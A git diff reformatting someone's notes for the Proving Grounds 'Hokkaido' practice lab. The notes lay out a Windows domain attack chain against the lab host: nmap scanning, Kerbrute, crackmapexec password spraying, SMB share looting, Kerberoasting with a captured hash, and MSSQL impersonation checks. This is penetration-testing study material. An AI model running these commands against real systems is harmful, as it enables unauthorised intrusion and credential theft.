@@ -1,25 +1,32 @@
+linkd:
+```bash
 https://medium.com/@sakyb7/proving-grounds-hokkaido-tjnull-oscp-prep-ca34df1e6491
 https://aditya-3.gitbook.io/oscp/readme/walkthroughs/pg-practice/hokkaido
-
-NMAP -p- -sCV hokkaido.pgp --open 
+```
+nmap
+```bash
+nmap -p- -sCV hokkaido.pgp --open 
+```
 - windows machine, check HTTP/LDAP/KERBRUTE/ENUM4LINUX/SMBCLIENT
 
 worth checking:
-
 ```bash
 1433/tcp  open  ms-sql-s
 8531/tcp  open  unknown
 ```
 
 Kerbrute gives us 4 usernames:
+```bash
 info
 administrator
 discovery
 maintenance
+```
 
 create wordlists with passwords (usernames as password included)
 
 example:
+```bash
 Winter2023
 Summer2023
 Spring2023
@@ -32,20 +39,26 @@ ofni
 rotartsinimda
 yrevocsid
 ecnanetniam
+```
 
 
 brute force with crackmapexec
-
+```bash
 crackmapexec smb hokkaido.pgp  --shares -u usernames -p usernames --continue-on-success
+```
 we have user with password info:info
 
+we have read write on homes
+```bash
 crackmapexec smb hokkaido.pgp  --shares -u info -p info
-shows we have read write on homes
+```
 
 
 lets login:
+```bash
 impacket-smbclient info:info@hokkaido.pgp
-
+```
+```bash
 shares -> use homes -> ls
 # use homes
 # ls
@@ -71,11 +84,11 @@ drw-rw-rw-          0  Sat Nov 25 09:57:09 2023 Rachel.Jones
 drw-rw-rw-          0  Sat Nov 25 09:57:09 2023 Sian.Gordon
 drw-rw-rw-          0  Sat Nov 25 09:57:09 2023 Tracy.Wood
 drw-rw-rw-          0  Sat Nov 25 09:57:09 2023 Victor.Kelly
-
+```
 Potential list of users
 
 more investigation, NETLOGON contains nice file
-
+```bash
 use NETLOGON
 # ls
 drw-rw-rw-          0  Sat Nov 25 08:40:08 2023 .
@@ -93,14 +106,17 @@ drw-rw-rw-          0  Sat Nov 25 08:40:08 2023 ..
 
 cat password_reset.txt 
 Initial Password: Start123!  
+```
 
 try
+```bash
 impacket-GetUserSPNs hokkaido-aerospace.com/'info':'info' -dc-ip hokkaido.pgp -debug -outputfile kerberoast.txt
+```
 noting special
 
 lets check new pass
 
-
+```bash
 crackmapexec smb hokkaido.pgp  --shares -u usernames -p 'Start123!' --continue-on-success
 SMB         hokkaido.pgp    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:hokkaido-aerospace.com) (signing:True) (SMBv1:False)
 SMB         hokkaido.pgp    445    DC               [-] hokkaido-aerospace.com\info:Start123! STATUS_LOGON_FAILURE 
@@ -108,18 +124,29 @@ SMB         hokkaido.pgp    445    DC               [-] hokkaido-aerospace.com\a
 SMB         hokkaido.pgp    445    DC               [+] hokkaido-aerospace.com\discovery:Start123! 
 SMB         hokkaido.pgp    445    DC               [-] hokkaido-aerospace.com\maintanance:Start123! STATUS_LOGON_FAILURE 
 SMB         hokkaido.pgp    445    DC               [-] hokkaido-aerospace.com\Start123!:Start123! STATUS_LOGON_FAILURE 
+```
 
 kerberoasting with new credentials:
-impacket-GetUserSPNs hokkaido-aerospace.com/'discovery:Start123!' -dc-ip hokkaido.pgp -debug -request -outputfile kerberoast.txt 
+```bash
+impacket-GetUserSPNs hokkaido-aerospace.com/'discovery:Start123!' -dc-ip hokkaido.pgp -debug -request -outputfile kerberoast.txt
+```
 !success!
 
+```bash
 $krb5tgs$23$*maintenance$HOKKAIDO-AEROSPACE.COM$hokkaido-aerospace.com/maintenance*$5d772265fe6e23708dd9ce45270b7694$6e74070d45746af3cf512ba74a142bdddd9721a0bf6be996001f2e08e84127d1678a4da1c0f435e08b598b72039fae01547a207028ddfcfcd5a54ec9381bad58930f67a081bccfe6e01447f00d4aea5d8e0442e917add68e994f87b9befe5d88952fbad0f81413ae3223ff9e0df9a1317cd2f02ca663f240aa7e285885eb109ef7fd6221102e078064c12d87609a8b2c9a257ff7f3f239d18556c84669f4977f70d25b39492b2e9c5d6a608befbb60d15f767e4130b1b23cd6e78aa4f32af64b7271061ca18903d8174a03b71a8d5f1b21f70b5be37a48217a8cce6d66cab9a6dd0d7d5768ec7c82f012a0b643b5e6804328cb2d88e479e616603307b098b20b35a649ce2ad31ad5f944d756bc064ea38e80e68b88dd0a9c88e3a62956c35cbf91fa6c07b2f57c92a9cb5f50f3c4b8cf8ebd2bc8ab106744b1bf21ee9d7d4498df9076e2fa0d8a724664cc67a394e388113ed3d628f186796194117cdd82c65da78b2bc650c4d685212e23c57d27ecbe738bde3efc30cc205dcfa5b37791c6687852fc2018e15b27963598ceb881cd629d7704cf8ee10172585088fc6a07724621753d34e72b452b72d2ffe2dc1be42893dd882a0f59ddeae19a753f6df212fa31f29e72b6b134218e744fce4d228a6376695f46c7685a0e5a72608a1bebad9d7607d038fb3428154b9c8dad1584b93a004289f585a10797791b3f05fce23cbcb8d723738d0448e4b19c888bbf127c63a5b208184d8d2cb81033a0172d69435ab6cd2a7bca9f1f347aaae8b7d9b2b92a2c4df34b226c932d47a03c26594f68e9ae3df1f634ddebca08debeea5030a0e455d52d0ebfbf14a921dee9f95f13c0b06a29a3911daedf51a286a6ada50e29fa400a61189a912a621fe5464e3b3538f914afe813efd7d3f8c0d9c065192de62645715c1b00de004af0b02a71ce9051c6cd830a8b7af1960886cf5a5394d11428cf56da4ac5662c7bfde1fe6879a3f9e2dda470b907e075231d68cdd8cc7851966616509a922fd943371e461a178422fdd4dce844e47cec3afcd72ef3058936051da15cbb618687796294cb6ba510b19d64e5d123346c5624dcccf58d9840ba1c4e0480dcdaa24cb453888b2559f4c4ec3e139b41d4fdc914ef4d211ea7faa1f4df62c9096e6f19b6df2d901d5482f11ffbe228d1c1983fba35fad2db75d76d2794c806f05d8b9cf08addae83dc7aa574a666938e5cb5e717f17223d8ac0e47b9d74badae3a87c322774a9e675250ddc89e37b7b666d70c106cd90780bdf3845f669f77c06ef17cff5ba573d5b29d8e32906131c48c88655d468abaf2e5b020675c2ce766b72858b77bb83e323792bf90bb621d7905a381eecd077e328f5ae9dec48e92566ea1b4a807a7a2aabd440b254a8dda00a9abc9b49d4196e7c8ad9a1bb16e1f8f412126d93728fa5595c2ec2e60e4fcb8d89381621f110cd2d25cbade6302b4a060ac349e06559f90d991f41914c792ca24ebc21b335bfc7c4ef0a1cad494922cfb18a6ce59185e7f420c3bff5000017bdf8cb012a2869927e4568e02d1647a7abcc24aafef7990135510477e
- we have hash but useless for now
+```
+
+We have hash but useless for now
 
 now lest check sql as it was worth checking
 
+```bash
 ipacket-mssqlclient  'hokkaido-aerospace.com/discovery':'Start123!'@hokkaido.pgp -dc-ip hokkaido.pgp -windows-auth
-next SELECT name FROM master.dbo.sysdatabases to enum DB
+```
+next 
+
+```bash
+SELECT name FROM master.dbo.sysdatabases to enum DB
 
 SQL (HAERO\discovery  guest@master)> SELECT name FROM master.dbo.sysdatabases
 name      
@@ -137,8 +164,9 @@ hrappdb
 
 SQL (HAERO\discovery  guest@master)> select * from hrappdb.INFORMATION_SCHEMA.TABLES;
 ERROR(DC\SQLEXPRESS): Line 1: The server principal "HAERO\discovery" is not able to access the database "hrappdb" under the current security context.
+```
 
-so we have an issue, check whoc an we inpersonate
+so we have an issue, check who can we inpersonate
 
 SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
 
